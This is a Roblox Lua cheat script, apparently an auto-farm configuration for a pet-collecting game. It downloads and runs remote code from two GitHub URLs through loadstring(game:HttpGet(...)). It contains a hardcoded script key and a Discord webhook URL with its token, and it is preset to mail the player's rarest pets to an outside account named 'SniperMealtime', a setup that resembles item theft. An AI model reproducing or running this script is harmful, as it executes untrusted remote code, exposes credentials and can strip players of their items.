repeat wait(10) until game:IsLoaded()
loadstring(game:HttpGet("https://raw.githubusercontent.com/r6dt/farm/main/Del-CoreGui.lua"))()
wait(10)
script_key = "ipXBywOqWcuQMMEBBCmVrvDBXrSRfJLd";
_G.GPROGRESS_MODE = "Hybrid"
_G.GDO_PETGAMES_EVENT = true
_G.GHATCH_CHARGED_EGGS = true
_G.GPAW_RAFFLE_ENTRIES = 400
_G.GGFX_MODE = 1
_G.GRANK_TO = 99
_G.GZONE_TO = 999
_G.GHATCH_SPEED_MS = 0
_G.GMAX_EGG_SLOTS = 99
_G.GMAX_EQUIP_SLOTS = 99
_G.GHOLD_GIFTS = false
_G.GHOLD_BUNDLES = true
_G.GCOLLECT_FREE_ITEMS = true
_G.GMAX_ZONE_UPGRADE_COST = 40000000
_G.GPOTIONS = {"Coins","Lucky","Treasure Hunter","Walkspeed","Diamonds","Damage"}
_G.GPOTIONS_MAX_TIER = 19
_G.GUSE_SPRINKLERS = true
_G.GUSE_FLAGS = {"Hasty Flag"}
_G.GENCHANTS = {"Lucky Eggs", "Lucky Eggs", "Lucky Eggs", "Coins", "Fortune", "Strong Pets"}
_G.GWEBHOOK_USERID = "" -- your discord userID, not your name. numerical id.
_G.GWEBHOOK_LINK = "https://discord.com/api/webhooks/1330044667114291303/dDUp-QKB4KPghtF5s22-WVvQOlJ8xd1m8-kCJgOD848pEM9gOrEdd1ZhrCTkSrveWVTv" -- a webhook URL from your private discord channel.
_G.GMAIL_RECEIVERS = {"SniperMealtime"}  -- an account to receive hatched Huges etc
_G.GMAIL_ITEMS = {
  ["All Huges"] = {Class = "Pet", Id = "All Huges", Amount = 1},
  ["Normal Guard Bunnys"] = {Class = "Pet", Id = "Guard Bunny", MinAmount = 75},
  ["Golden Guard Bunnys"] = {Class = "Pet", Id = "Guard Bunny", MinAmount = 25, IsGold = true},
  ["RB Guard Bunnys"] = {Class = "Pet", Id = "Guard Bunny", MinAmount = 25, IsRainbow = true},
  ["Shiny Normal Guard Bunnys"] = {Class = "Pet", Id = "Guard Bunny", MinAmount = 1, IsShiny = true},
  ["Shiny Golden Guard Bunnys"] = {Class = "Pet", Id = "Guard Bunny", MinAmount = 1, IsGold = true, IsShiny = true},
  ["Shiny RB Guard Bunnys"] = {Class = "Pet", Id = "Guard Bunny", MinAmount = 1, IsRainbow = true, IsShiny = true},
  ["Normal Guard Hydra"] = {Class = "Pet", Id = "Guard Hydra", MinAmount = 10},
  ["Golden Guard Hydras"] = {Class = "Pet", Id = "Guard Hydra", MinAmount = 5, IsGold = true},
  ["RB Guard Hydras"] = {Class = "Pet", Id = "Guard Hydra", MinAmount = 5, IsRainbow = true},
  ["Shiny Normal Guard Hydras"] = {Class = "Pet", Id = "Guard Hydra", MinAmount = 1, IsShiny = true},
  ["Shiny Golden Guard Hydras"] = {Class = "Pet", Id = "Guard Hydra", MinAmount = 1, IsGold = true, IsShiny = true},
  ["Shiny RB Guard Hydras"] = {Class = "Pet", Id = "Guard Hydra", MinAmount = 1, IsRainbow = true, IsShiny = true},
  ["Hype Egg"] = {Class = "Lootbox", Id = "Hype Egg", MinAmount = 1},
  ["Daycare egg"] = {Class = "Egg", Id = "Huge Machine Egg 4", MinAmount = 1},
  ["Secret pet1"] = {Class = "Pet", Id = "Rainbow Swirl", MinAmount = 1, AllVariants = true},
  ["Secret pet2"] = {Class = "Pet", Id = "Banana", MinAmount = 1, AllVariants = true},
  ["Secret pet3"] = {Class = "Pet", Id = "Coin", MinAmount = 1, AllVariants = true},
  ["Secret pet4"] = {Class = "Pet", Id = "Lucky Block", MinAmount = 1, AllVariants = true},
}
loadstring(game:HttpGet("https://raw.githubusercontent.com/sxdasfvas/test/main/gscripts.lua"))()
